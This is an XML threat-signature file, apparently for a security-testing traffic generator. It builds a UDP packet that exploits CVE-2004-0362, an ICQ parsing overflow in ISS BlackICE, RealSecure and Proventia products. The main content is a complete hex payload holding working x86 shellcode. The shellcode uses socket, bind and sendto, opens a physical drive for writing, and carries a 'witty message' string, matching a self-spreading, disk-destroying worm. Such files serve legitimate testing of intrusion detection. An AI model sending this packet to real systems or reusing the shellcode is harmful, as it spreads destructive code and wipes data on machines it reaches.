<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="ISS ICQ parsing vulnerability"/>
    <EngDesc display="true" value="There is a vulnerability within several ISS security products, including BlackICE, RealSecure, and Proventia, in the way they parse the ICQ messaging protocol. An attacker, exploiting this vulnerability, can cause a buffer overflow, resulting in the termination of a service or execution of arbitrary code."/>
    <Intent display="true"/>
    <Protocol display="true" value=""/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Internet_Security_Systems"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Internet_Security_Systems_Internet_Security_Systems_RealSecure_Network"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_RealSecure_Server_Sensor"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_Proventia_A_Series_XPU"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_Proventia_G_Series_XPU"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_Proventia_M_Series_XPU"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_RealSecure_Desktop"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_RealSecure_Guard"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_RealSecure_Sentry"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_BlackICE_PC_Protection"/>
      <item value="Internet_Security_Systems_Internet_Security_Systems_BlackICE_Server_Protection"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Internet_Security_Systems_RealSecure_Network_7.0"/>
      <item value="_XPU_22.11_and_before"/>
      <item value="Internet_Security_Systems_RealSecure_Server_Sensor_7.0_XPU_22.11_and_before"/>
      <item value="Internet_Security_Systems_Proventia_A_Series_XPU_22.11_and_before"/>
      <item value="Internet_Security_Systems_Proventia_G_Series_XPU_22.11_and_before"/>
      <item value="Internet_Security_Systems_Proventia_M_Series_XPU_1.9_and_before"/>
      <item value="Internet_Security_Systems_RealSecure_Desktop_7.0_ebl_and_before"/>
      <item value="Internet_Security_Systems_RealSecure_Desktop_3.6_ecf_and_before"/>
      <item value="Internet_Security_Systems_RealSecure_Guard_3.6_ecf_and_before"/>
      <item value="Internet_Security_Systems_RealSecure_Sentry_3.6_ecf_and_before"/>
      <item value="Internet_Security_Systems_BlackICE_PC_Protection_3.6_ccf_and_before"/>
    </Known_Versions_Affected>
    <Credit display="true" value="FSC20040319-01"/>
    <CVEID display="true" value="CVE-2004-0362"/>
    <bugtraqID display="true" value="9913"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="ThreatEx Team"/>
    <ID display="true" value="11b8db457edf3537221c392aa72ef430"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="True"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value=""/>
    <Authentication display="false" value=""/>
    <ConfImpact display="false" value=""/>
    <IntegImpact display="false" value=""/>
    <AvailImpact display="false" value=""/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value="normal"/>
    <LastModified display="false" value="633601080303906250"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value="B"/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1213725119" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
    <NamedVar name="AOLdestPort" type="ImperfectControls.Port" value="null" index="H"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="D"/>
      <for index="E"/>
      <for index="F"/>
      <for index="G"/>
      <for index="H"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="6ECB" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
        <UDP srcPort="@random(1026,65535)" destPort="$AOLdestPort" checksum="" length="" Payload="050000000000001202000000000000000000000000022C00050000000000006E000000000000000000000000000000000001000000000000000000000000000000000000410205000000000000DE030000000000000000000000000000000100000100000100001E0220202020202020285E2E5E29202020202020696E73657274207769747479206D65737361676520686572652E202020202020285E2E5E292020202020202089E78B7F1483C70881C4E8FDFFFF31C966B9333251687773325F543EFF159C400D5E89C331C966B965745168736F636B54533EFF1598400D5E6A116A026A02FFD089C631C9516862696E6454533EFF1598400D5E31C951515181E9FEFFF05F5189E16A105156FFD031C966B9746F516873656E6454533EFF1598400D5E89C383C43C31C95168656C3332686B65726E543EFF159C400D5E31C951686F756E746869636B43684765745454503EFF1598400D5EFFD089C583C41C31C981E9E0B1FFFF5131C02D03BCFCFFF7E52D3D61D9FF89C131C02D03BCFCFFF7E12D3D61D9FF89C531D25252C1E9106689C85031C02D03BCFCFFF7E52D3D61D9FF89C530E4B0025089E06A105031C0502D03BCFCFFF7E52D3D61D9FF89C5C1E81780C403505756FFD383C41059E29831C02D03BCFCFFF7E52D3D61D9FF89C5C1E81080E40780CC30B045506844524956684943414C6850485953685C5C2E5C89E031C951B220C1E218526A03516A03D1E252503EFF15DC400D5E83C41431C981E9E0B1FFFF3DFFFFFFFF0F8437FFFFFF5689C631C050502D03BCFCFFF7E52D3D61D9FF89C5D1E86689C850563EFF15C4400D5E31C95189E25152B580D1E151B15EC1E11851563EFF1594400D5E563EFF1538400D5E5E5EE9ACFEFFFF6376075EE921FEFFFF0043666A76636C623431505135306A48315063345051555948783774654F7A5453545954654C4D410D0A446C443352376C56744243756B6B68647A2B32766F753033416335574F526B75717267644B7275315A494F436C53522F78514F694B6F36487A4A75675272493473374F6B534B7750714C75340D0A3562614E62523067504E595040003406B66240445219928E0442674162414630454441415741414141414141414141313833223E0A2020202020800100004600000046000000800000000200000066CC5B40EF1C0D0083E100B011000600D0030000D00300000004000002000000AACC5B400E27070083E100000000000200B0D02BA49B0800450003C20A7200008011000083E11BB1BA5402A20FA006A503AEEB72050000000000001202000000000000000000000000022C00050000000000006E0000000000000000000000325E801D331D200C958310167B1100070046000000460000008000"/>
      </IP>
    </Ethernet>
  </Output>
</threatSignature>
